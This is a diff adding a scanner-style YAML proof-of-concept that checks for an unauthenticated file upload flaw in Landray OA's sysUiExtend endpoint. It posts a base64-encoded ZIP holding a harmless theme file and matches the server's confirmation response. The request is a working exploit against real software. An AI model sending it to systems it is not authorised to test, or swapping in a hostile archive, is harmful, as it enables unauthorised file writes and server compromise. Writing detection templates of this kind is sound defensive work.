@@ -1,0 +1,35 @@
+name: poc-yaml-landray-sysuiextend-file-upload
+transport: http
+set:
+  rboundary: randomLowercase(8)
+  s1: |-
+    base64Decode("UEsDBAoAAAAAAOahFlfVzhfFLwAAAC8AAAAGAAAAdWkuaW5paWQ9Y2FsZW5kYXIKbmFtZT1jYWxlbmRhci1wcm9kCnRodW1iPXRodW1iLmpwZwpQSwECPwAKAAAAAADmoRZX1c4XxS8AAAAvAAAABgAkAAAAAAAAACAAAAAAAAAAdWkuaW5pCgAgAAAAAAABABgAAMjPTPLU2QEAAAAAAAAAAAAAAAAAAAAAUEsFBgAAAAABAAEAWAAAAFMAAAAAAA==")
+rules:
+  r0:
+    request:
+      method: POST
+      path: /sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo&s_ajax=true
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"filePath\"\r\n\
+        \r\n\
+        \r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"fileName\"\r\n\
+        \r\n\
+        \r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"LRToken.zip\"\r\n\
+        Content-Type: application/zip\r\n\
+        \r\n\
+        {{s1}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: |-
+      response.status == 200
+      && response.body_string.contains('{"fdThumbnail":"resource/ui-ext/calendar/thumb.jpg","directoryPath":"calendar","status":"1"}')
+
+expression: r0()
